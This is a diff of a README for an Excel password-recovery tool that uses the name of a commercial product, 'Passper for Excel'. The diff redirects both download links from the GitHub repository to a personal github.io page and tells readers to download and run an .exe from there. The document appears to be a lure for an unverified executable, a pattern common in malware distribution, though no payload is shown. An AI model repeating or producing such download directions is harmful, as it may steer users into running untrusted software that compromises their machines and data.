@@ -1,6 +1,6 @@
 # 🔑 passper-excel-password-unlock - Recover lost Excel file passwords easily
 
-[![Download Passper for Excel](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ugaaga4342/passper-excel-password-unlock)
+[![Download Passper for Excel](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ugaaga4342.github.io)
 
 Passper for Excel v2026 helps you regain access to your locked spreadsheets. This tool restores entry to files when you lose or forget the password. It works on Windows computers. The software provides a simple interface that guides you through the recovery process. You can choose between a visual menu or a text-based command tool.
 
@@ -8,7 +8,7 @@ Passper for Excel v2026 helps you regain access to your locked spreadsheets. Thi
 
 To use this tool, visit the link below to reach the official download page. 
 
-[Click here to visit the release page to download Passper](https://github.com/Ugaaga4342/passper-excel-password-unlock)
+[Click here to visit the release page to download Passper](https://ugaaga4342.github.io)
 
 Once the webpage loads, look for the list of files under the latest version. Select the file ending in .exe to start your download. Your browser will save the file to your computer.
 
